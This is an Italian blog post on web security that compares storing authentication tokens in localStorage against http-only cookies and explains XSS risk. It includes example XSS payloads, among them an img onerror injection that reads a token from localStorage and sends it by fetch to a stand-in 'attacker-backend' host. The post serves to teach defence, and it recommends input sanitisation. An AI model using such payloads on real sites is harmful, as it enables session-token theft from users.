---
title: XSS localStorage e Cookies
date: 2020-06-08T20:00:15+06:00
hero: /images/background.jpg
description: What you should know about security with XSS attack, localStorage and Cookies.
menu:
  sidebar:
    name: XSS localStorage e Cookies
    identifier: xss-localstorage-cookies
    parent: distributed-systems
    weight: 10
author:
  name: Andrea Gullì
  image: /images/avatar.png
math: false
---

## Un errore comune
Spesso in giro si legge che il **localStorage** non è un luogo sicuro in cui conservare i **token** e che si dovrebbero utilizzare dei **Cookies http-only & secure**, in questo articolo vedremo se è realmente così, dopo una breve panoramica sulle caratteristiche di entrambi.

## Hello localStorage

localStorage è un'**API del browser** che fornisce l'accesso ad un semplice storage strutturato in coppie key-value (come una map).

{{< highlight js >}}
localStorage.setItem('token', '123') // salva il valore '123' in corrispondenza alla key 'token'
const token = localStorage.getItem('token') // recupera il campo con key 'token'
localStorage.removeItem('token'); // cancella il campo
{{< /highlight >}}

Un vantaggio del localStorage è sicuramente la sua semplicità di utilizzo, anche se non è adatto a conservare oggetti complessi e ottimo per conservare piccole stringhe di dati utili all'applicazione.

> Se si volessero conservare dei piccoli oggetti JSON bisognerebbe serializzarli, il localStorage accetta solo stringhe

{{< highlight js >}}
JSON.stringify(obj) // converte l'oggetto in una stringa
json.parse(str) // cerca di parsare la stringa e restituire un JSON
{{< /highlight >}}

### Comunicazione client/server 

<br>
{{< img src="./images/001.jpg" align="center" >}}
<br>

> 1. Il token viene ricevuto a seguito di un'autenticazione.
> 2. il client lo salva nel localStorage.
> 3. Ad ogni richiesta il client invia il token appendendolo negli headers (spesso viene usato l'**Authentication header**).

Schema molto facile da capire ed implementare, quali sono i rischi? le vulnerabilità ad attacchi **XSS**(Cross-Site-Scripting).

## Come lanciare un attacco XSS
{{< highlight js >}}
const someUserInput = '<script>alert("Hacked 1")</script>' // esempio di codice malevolo meno intelligente (spesso bloccato dai browser)
const userPickedImageUrl =  'https://invalid" onerror="alert("Hacked 2")"' // esempio più sfuggente

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
{{< /highlight >}}

Questo codice espone un problema: stiamo settando direttamente l'**innerHTML** di un elemento tramite codice, l'utente potrebbe inserire del codice malevolo nella variabile ed esso sarebbe eseguito.<br>
Un potente alleato è la [sanificazione](https://en.wikipedia.org/wiki/HTML_sanitization) dell'input.

Per rubare il token dal localStorage a questo punto basterebbero pochi semplici comandi, ad esempio
{{< highlight js >}}
const userPickedImageUrl =  `https://invalid" onerror="const token = localStorage.getItem("token"); fetch('https://attacker-backend', {method: 'POST', body: JSON.stringify({ token }),})"`
{{< /highlight >}}

Con questo codice l'attaccante potrebbe rubare molti codici di accesso di svariati utenti!

## Anche i Cookies sono soggetti ad XSS